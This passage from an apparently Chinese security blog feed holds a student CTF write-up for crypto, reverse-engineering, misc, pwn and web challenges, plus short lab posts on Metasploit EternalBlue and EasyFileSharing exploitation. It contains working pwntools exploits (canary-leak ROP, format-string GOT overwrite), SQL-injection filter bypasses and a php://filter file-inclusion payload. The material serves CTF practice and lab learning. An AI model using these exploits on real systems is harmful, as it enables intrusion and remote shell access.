5870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
x =-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
#x=p-q
c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
p=Int('p')
solve((p-x)*p==n)
q=Int('q')
solve((q+x)*q==n)
import gmpy2
from Crypto.Util.number import long_to_bytes
n=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
x =-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
e=65537
p=30697352531330434856674588715905741896538207322123455679076478093195252240812032665803037835289865152784098077605359655486723575203621508201904205626825328632340569805064205047909749046701590344754257018324448436810374908046833801210988143008924043901109029730458966709669708451252061195235570558910738154083634093497318083877286614306923427160713075752860556509004687350746768578465885884145482528431003386829431965250868646361821676571510726939416897822283852421262616728229663652002544064443613737966055339522820176866519596663623744466631149567795708311336148219848210798881176646765091102193180034355210912558857
q=27645282466792257817358384518715154123933486746276391774444263805549184785758801611331727512618316117511830402291064671589992764575159205025150465127288678123273537254064555405597566045234264775696535233870342993688075308678745590840323230545378985874470970254306849398957159842378297616929194560560009113289974948388515331563429630185479068783351179683616591359572060950115733092007970489291940798526853201952607101543451447208843400052850424803320216100092186342006347459230274434357647688100553885838717057678699728084320705167709841528456836129264040561415840443911854851862230026044112813788167529469759180327221
phi=(p-1)*(q-1)
d=gmpy2.invert(e,phi)
m=pow(c,d,n)
print (long_to_bytes(m))
</code></pre>
<h3 id="维也纳的秘密">维也纳的秘密</h3>
<p>wieners'attack</p>
<h4 id="脚本-4">脚本</h4>
<pre><code>e=25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193
n=106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819
c=15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160
import gmpy2
from Crypto.Util.number import long_to_bytes


def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式
    res = []
    while y:
        res.append(x // y)
        x, y = y, x % y
    return res


def continued_fraction(sub_res):
    numerator, denominator = 1, 0
    for i in sub_res[::-1]:  # 从sublist的后面往前循环
        denominator, numerator = numerator, i * numerator + denominator
    return denominator, numerator  # 得到渐进分数的分母和分子，并返回


# 求解每个渐进分数
def sub_fraction(x, y):
    res = transform(x, y)
    res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res)))))  # 将连分数的结果逐一截取以求渐进分数
    return res


def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q
    par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解
    x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)
    return x1, x2


def wienerAttack(e, n):
    for (d, k) in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
        if k == 0:  # 可能会出现连分数的第一个为0的情况，排除
            continue
        if (e * d - 1) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
            continue

        phi = (e * d - 1) // k  # 这个结果就是 φ(n)
        px, qy = get_pq(1, n - phi + 1, n)
        if px * qy == n:
            p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现
            d = gmpy2.invert(e, (p - 1) * (q - 1))  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
            return d
    print(&quot;该方法不适用&quot;)
d=wienerAttack(e,n)
print(&quot;d=&quot;,d)
key=pow(c, d, n)
print(key)
key1=long_to_bytes(key)
print(key1)
</code></pre>
<h3 id="我只吃素">我只吃素</h3>
<h4 id="脚本-5">脚本</h4>
<pre><code>from Crypto.Util.number import long_to_bytes
s=open('F:/markdown/Typora/SAVES/校赛题目/20200923/Crypto/我只吃素.txt','r').read()
b = [3,5,7,11,13,17,19,23,29,31]
for i in b:
    s=int(s,i)
    s=hex(s)[2:]
    s=bytes.fromhex(s).decode()
dic={}
for i in range(10):
    dic[chr(ord('0')+i)]=i
for i in range(26):
    dic[chr(ord('a') + i)] = i+10
for i in range(26):
    dic[chr(ord('A') + i)] = i+10+26
print(dic)

def change(s, k):
    j=0
    res=0
    for i in range(len(s)):
        res += dic[s[len(s) - i - 1]] * pow(k, j)
        j+=1
    return res
c = [37, 41, 43, 47, 53, 59, 61]
for j in c:
    s=change(s,j)
    s=hex(s)[2:]
    c=s
    s = bytes.fromhex(s).decode()
ss=int(c,16)
print(long_to_bytes(ss))
print(s)
</code></pre>
<h2 id="re">RE</h2>
<h3 id="re1">re1</h3>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1601205060940.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1601205069100.png" alt="" loading="lazy"></figure>
<h3 id="re2">re2</h3>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1601205077620.png" alt="" loading="lazy"></figure>
<p>脱壳机脱壳</p>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1601205085576.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1601205093318.png" alt="" loading="lazy"></figure>
<h3 id="re3">re3</h3>
<p>从python字节码可看出是存入一个数组cipher，再与19异或得flag</p>
<h4 id="脚本-6">脚本</h4>
<pre><code>cipher=[80,70,94,71,80,71,85,104,86,39,64,106,76,67,
   106,71,123,92,125,76,37,106,103,118,80,35,119,32,110]
b=''
for i in range(29):
    b+=chr(cipher[i]^19)
    print(b)
</code></pre>
<h3 id="re4">re4</h3>
<p>无壳，32位</p>
<p>加密函数</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1601205154701.png" alt="" loading="lazy"></figure>
<p>存在v15的字符</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1601205183970.png" alt="" loading="lazy"></figure>
<p>正向脚本</p>
<pre><code>v15=[0x15,0x02,0x0A,0x16,0x13,0x0B,0x11,0x08,0x03,0x1B,0x19,0x21,0x12,0x1A,
     0x18,0x10,0x09,0x22,0x24,0x17,0x04,0x0E,0x0C,0x14,0x1E,0x00,0x1D,0x07,
     0x01,0x06,0x1F,0x0F,0x05,0x1C,0x0D,0x23,0x20,0x25]
a='eMl1_l1hT9_ldcoR3OC1CW0HhC_{UF30Tp__l}'
b=''
for j in range(len(v15)):
    b+=a[v15[j]]
    print(b)
</code></pre>
<p>其实a=flag[v15[j]]</p>
<p>逆向脚本不会写</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1601205194993.png" alt="" loading="lazy"></figure>
<p>再排序</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1601205201637.png" alt="" loading="lazy"></figure>
<h2 id="misc">Misc</h2>
<h3 id="连签到都算不上">连签到都算不上</h3>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1601205220371.png" alt="" loading="lazy"></figure>
<p>得</p>
<pre><code>\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u5e73\u7b49\u81ea\u7531\u8bda\u4fe1\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u516c\u6b63\u6cd5\u6cbb\u53cb\u5584\u5e73\u7b49\u5e73\u7b49\u6cd5\u6cbb\u548c\u8c10\u548c\u8c10\u516c\u6b63\u8bda\u4fe1\u6587\u660e\u516c\u6b63\u548c\u8c10\u548c\u8c10\u5bcc\u5f3a\u516c\u6b63\u8bda\u4fe1\u548c\u8c10\u548c\u8c10\u548c\u8c10\u5e73\u7b49\u8bda\u4fe1\u5e73\u7b49\u548c\u8c10\u6587\u660e\u5e73\u7b49\u8bda\u4fe1\u5e73\u7b49\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u516c\u6b63\u6587\u660e\u6c11\u4e3b\u6cd5\u6cbb\u8bda\u4fe1\u548c\u8c10\u000d\u000a
</code></pre>
<p>继续转</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1601205241220.png" alt="" loading="lazy"></figure>
<p>继续转</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1601205251698.png" alt="" loading="lazy"></figure>
<h3 id="真签到题">真签到题</h3>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1601205294999.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1601205311610.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://7usai.github.io/post-images/1601205326113.png" alt="" loading="lazy"></figure>
<h3 id="大鲨鱼之你可劲找">大鲨鱼之你可劲找</h3>
<p>这题真的很恶心<br>
<img src="https://7usai.github.io/post-images/1601205336893.png" alt="" loading="lazy"></p>
<p>先搜索flag，发现全是http</p>
<p>再缩小范围</p>
<figure data-type="image" tabindex="18"><img src="https://7usai.github.io/post-images/1601205347454.png" alt="" loading="lazy"></figure>
<p>这里可以看到是这样的sql语句</p>
<figure data-type="image" tabindex="19"><img src="https://7usai.github.io/post-images/1601205357377.png" alt="" loading="lazy"></figure>
<p>追踪http流</p>
<figure data-type="image" tabindex="20"><img src="https://7usai.github.io/post-images/1601205365585.png" alt="" loading="lazy"></figure>
<p>分为好几组，每一组确定一个十进制数，一组有好几段，每段后面都有一串字符，根据不同的字符判断是&gt;还是&lt;=，数就完事了，</p>
<figure data-type="image" tabindex="21"><img src="https://7usai.github.io/post-images/1601205375301.png" alt="" loading="lazy"></figure>
<h4 id="脚本-7">脚本</h4>
<pre><code>a=[99,101,99,99,49,51,57,52,45,54,49,51,51,45,52,51,
100,48,45,98,101,48,54,45,97,52,49,99,53,102,50,51,49,100,100,52,125]
b=''
for i in range(len(a)):
    b+=chr(a[i])
    print(b)
</code></pre>
<h3 id="别做题了听歌吧">别做题了听歌吧</h3>
<figure data-type="image" tabindex="22"><img src="https://7usai.github.io/post-images/1601205385896.jpg" alt="" loading="lazy"></figure>
<p>用MP3stego分离</p>
<figure data-type="image" tabindex="23"><img src="https://7usai.github.io/post-images/1601205396602.png" alt="" loading="lazy"></figure>
<p>得到这个</p>
<figure data-type="image" tabindex="24"><img src="https://7usai.github.io/post-images/1601205404190.png" alt="" loading="lazy"></figure>
<p>放入010editor</p>
<figure data-type="image" tabindex="25"><img src="https://7usai.github.io/post-images/1601205410895.png" alt="" loading="lazy"></figure>
<p>09为-，20为.，0D0A为\转化摩斯密码</p>
<figure data-type="image" tabindex="26"><img src="https://7usai.github.io/post-images/1601205417668.jpg" alt="" loading="lazy"></figure>
<h3 id="兔兔那么可爱">兔兔那么可爱</h3>
<p>以txt方式打开flag文件</p>
<figure data-type="image" tabindex="27"><img src="https://7usai.github.io/post-images/1601205424847.png" alt="" loading="lazy"></figure>
<p>斐波那契数列</p>
<h4 id="脚本-8">脚本</h4>
<pre><code>filename=&quot;C://Users/lenovo/Desktop/Misc3/flag.txt&quot;
fp=open(filename,&quot;r&quot;)
content=fp.read()
fp.close()
nterms = int(input(&quot;你需要几项？&quot;))
n1 = 0
n2 = 1
count = 2
if nterms &lt;= 0:
    print(&quot;请输入一个正整数。&quot;)
elif nterms == 1:
    print(&quot;斐波那契数列：&quot;)
    print(n1)
else:
    print(&quot;斐波那契数列：&quot;)
    print(n1, &quot;,&quot;, n2, end=&quot; , &quot;)
    while count &lt; nterms:
        nth = n1 + n2
        print(nth, end=&quot; , &quot;)
        print(content[nth-1])
        n1 = n2
        n2 = nth
        count += 1
</code></pre>
<p>得flag</p>
<h2 id="pwn">pwn</h2>
<h3 id="test_nc">test_nc</h3>
<p>nc一下加qq要flag</p>
<figure data-type="image" tabindex="28"><img src="https://7usai.github.io/post-images/1601205435175.png" alt="" loading="lazy"></figure>
<h3 id="babystack">babystack</h3>
<p>当输入为1_love_y0u时拿到shell</p>
<h3 id="canary">canary</h3>
<figure data-type="image" tabindex="29"><img src="https://7usai.github.io/post-images/1601205443639.png" alt="" loading="lazy"></figure>
<p>buf在rsp+10，v3在rsp+48，两个相距0x38，输入‘a’*0x38，泄露出来canary的值，但是要减去换行符0xa，再通过ROPgadget找到sh的地址，构造payload。</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
r=remote('202.119.201.197',10004)
elf=ELF('./canary')
sys=0x4005F0
sh_addr=0x0400904
ret_rdi=0x00000000004008e3
r.recvuntil(&quot;Let's pwn it!&quot;)
payload='a'*0x38
r.sendline(payload)
r.recvuntil('a'*0x38)
canary=r.recv(8)
canary=canary.ljust(8,'\x00')
canary=u64(canary)-0xa
log.info(&quot;canary:&quot;+hex(canary))
payload=&quot;\x90&quot;*0x38+p64(canary)+&quot;\x90&quot;*0x8+p64(sh_addr)+p64(sys)
r.sendline(payload)
r.recv()
r.interactive()
</code></pre>
<h3 id="fmstr">fmstr</h3>
<figure data-type="image" tabindex="30"><img src="https://7usai.github.io/post-images/1601205452797.png" alt="" loading="lazy"></figure>
<p>Gets（）不限制输入，printf处有格式化字符串漏洞，可以从中泄露出输入的偏移，然后用fmstr_payload()把puts的got表中的内容改为backdoor的地址</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
from LibcSearcher import *
r=remote('202.119.201.197',10006)
elf=ELF('./fmstr')
sys=0x0804857D
puts_got=elf.got['puts']
payload=fmtstr_payload(8,{puts_got:sys})
r.sendline(payload)
r.interactive()
</code></pre>
<h3 id="babyrop">babyrop</h3>
<figure data-type="image" tabindex="31"><img src="https://7usai.github.io/post-images/1601205468718.png" alt="" loading="lazy"></figure>
<p>buf实际在ebp-6c，但却要输入0x100，存在溢出，并没有在发现system（），但发现可以通过泄露write的got表的内容得到write的实际地址，然后通过泄露出的地址的后三位查找libc的版本</p>
<h2 id="web">web</h2>
<h3 id="web签到">web签到</h3>
<p>步骤</p>
<figure data-type="image" tabindex="32"><img src="https://7usai.github.io/post-images/1601205478240.png" alt="" loading="lazy"></figure>
<p>打开发现需要GET传参但并未指明参数，多次尝试发现只需要传入?1即可；</p>
<figure data-type="image" tabindex="33"><img src="https://7usai.github.io/post-images/1601205485110.png" alt="" loading="lazy"></figure>
<ol>
<li>传入发现需要post一个2，多次尝试发现并没有反应，于是使用burpsuite</li>
</ol>
<figure data-type="image" tabindex="34"><img src="https://7usai.github.io/post-images/1601205494381.png" alt="" loading="lazy"></figure>
<p>在params里填好参数后发现2后面多了一个等号，然后就传参成功，并且发现php代码；</p>
<figure data-type="image" tabindex="35"><img src="https://7usai.github.io/post-images/1601205503388.png" alt="" loading="lazy"></figure>
<p>明显是使用PHP伪协议查看源文件即可获得flag</p>
<figure data-type="image" tabindex="36"><img src="https://7usai.github.io/post-images/1601205511353.png" alt="" loading="lazy"></figure>
<p>base64解码即可</p>
<figure data-type="image" tabindex="37"><img src="https://7usai.github.io/post-images/1601205520780.png" alt="" loading="lazy"></figure>
<h3 id="babysqli">Babysqli</h3>
<p>使用burpsuite进行注入后发现空格被过滤了，使用/**/ 替代空格；</p>
<figure data-type="image" tabindex="38"><img src="https://7usai.github.io/post-images/1601205528504.png" alt="" loading="lazy"></figure>
<p>并且发现下方注释，猜测flag可能在password里面，使用SQL语句查询</p>
<figure data-type="image" tabindex="39"><img src="https://7usai.github.io/post-images/1601205537338.png" alt="" loading="lazy"></figure>
<p>发现flag，成功</p>
<h3 id="secret">Secret</h3>
<p>发现图片，并且下载图片，按文本格式打开，后发现php代码</p>
<figure data-type="image" tabindex="40"><img src="https://7usai.github.io/post-images/1601205544688.png" alt="" loading="lazy"></figure>
<p>进行代码审计，题目要求需要使用GET方式提交param1和param2,然后使用POST方式提交param1与 param2;file_get_contents(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>)</mo><mi mathvariant="normal">是</mi><mi mathvariant="normal">指</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mi mathvariant="normal">以</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">形</mi><mi mathvariant="normal">式</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">，</mi><mi>i</mi><msub><mi>s</mi><mi>n</mi></msub><mi>u</mi><mi>m</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>c</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">str1)是指需要str1以文件的形式写入值，is_numeric(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mopen">(</span></span></span></span>str2)是判断str2是否为数字并且可以识别十进制和十六进制，str2需要等于2592000，sleep()函数是要程序沉睡一段时间，if(((string)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>!</mo><mo>=</mo><mo>=</mo><mo>(</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">str1!==(string)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span>str2)&amp;&amp;(sha1(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>)</mo><mo>=</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">str1)===sha1(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord">1</span><span class="mopen">(</span></span></span></span>str2)))是指需要让str1与str2的字符串形式不同，并且经过sha1()后相同；绕过这些限制救可获得flag；</p>
<figure data-type="image" tabindex="41"><img src="https://7usai.github.io/post-images/1601205552672.png" alt="" loading="lazy"></figure>
<blockquote>
<p>使用十六进制绕过sleep()函数；</p>
<p>使用data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k向str2中写入内容</p>
<p>关于sha1()函数的绕过，网上查找到文章https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/</p>
</blockquote>
<h3 id="babysqli2">Babysqli2</h3>
<p>按照传统试一试平常的注入语句，之后发现过滤了单引号，网上查询可使用斜杠转义前面的单引号；</p>
<figure data-type="image" tabindex="42"><img src="https://7usai.github.io/post-images/1601205565567.png" alt="" loading="lazy"></figure>
<p>绕过成功，但是只显示了登录成功信息，猜测多半是盲注；发现substr() mid() 等函数被过滤了，但是left()仍可以使用；</p>
<p>由于flag的开头为C 所以就尝试猜测flag在password中的位置<img src="https://7usai.github.io/post-images/1601205573480.png" alt="" loading="lazy"></p>
<p>结果发现flag在第九行；之后便使用笨办法对flag进行逐个字母爆破，下方即为最终爆破结果，按照ascii码表转换为字母即可格式为		CUMTCTF{}，大括号内全为小写；</p>
<figure data-type="image" tabindex="43"><img src="https://7usai.github.io/post-images/1601205580981.png" alt="" loading="lazy"></figure>
<h3 id="简单文件包含">简单文件包含</h3>
<p>页面提示需要只支持本地请求，使用burpsuite，X-Forwarded-For：127.0.0.1 没有反应  然后尝试使用client-ip:127.0.0.1  成功；</p>
<figure data-type="image" tabindex="44"><img src="https://7usai.github.io/post-images/1601205588605.png" alt="" loading="lazy"></figure>
<p>发现使用了include_once()函数，并且使用了两次，该函数只能包含同一文件一次，继续网上查找方法；发现一个重复require_once()的函数的文章，是使用伪协议配合多级符号链接的办法进行绕过的；</p>
<pre><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://7usai.github.io/post-images/1601205595546.png" alt="" loading="lazy"></figure>
<p>base64解码即可</p>
<figure data-type="image" tabindex="46"><img src="https://7usai.github.io/post-images/1601205601495.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ms17-010漏洞利用]]></title>
        <id>https://7usai.github.io/post/9s2K54U7q/</id>
        <link href="https://7usai.github.io/post/9s2K54U7q/">
        </link>
        <updated>2020-09-20T08:16:24.000Z</updated>
        <content type="html"><![CDATA[<p>安装win7虚拟机</p>
<p>开启win7 445端口</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600589823167.png" alt="" loading="lazy"></figure>
<p><img src="https://7usai.github.io/post-images/1600589829978.png" alt="" loading="lazy"><br>
开启msf<br>
<img src="https://7usai.github.io/post-images/1600589833942.png" alt="" loading="lazy"></p>
<p>寻找攻击模块</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600589837383.png" alt="" loading="lazy"></figure>
<p>调用模块use exploit/windows/smb/ms17_010_eternalblue</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600589841598.png" alt="" loading="lazy"></figure>
<p>show payloads后选windows/x64/meterpreter/reverse_tcp</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600589845319.png" alt="" loading="lazy"></figure>
<p>开始攻击</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600589849159.png" alt="" loading="lazy"></figure>
<p>成功获得shell</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用msf利用easyfilesharing漏洞]]></title>
        <id>https://7usai.github.io/post/1ucQSUb1Y/</id>
        <link href="https://7usai.github.io/post/1ucQSUb1Y/">
        </link>
        <updated>2020-09-20T03:46:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="思路">思路</h3>
<p>1.安装一个win10虚拟机<br>
2.开启win10虚拟机端口<br>
3.开始攻击</p>
<p>win10ip地址</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600573646446.png" alt="" loading="lazy"></figure>
<p>查看开启端口</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600573658331.png" alt="" loading="lazy"></figure>
<p>这里可以看到80端口为easyfilesharing，因为在win10虚拟机里我们设置的就为80</p>
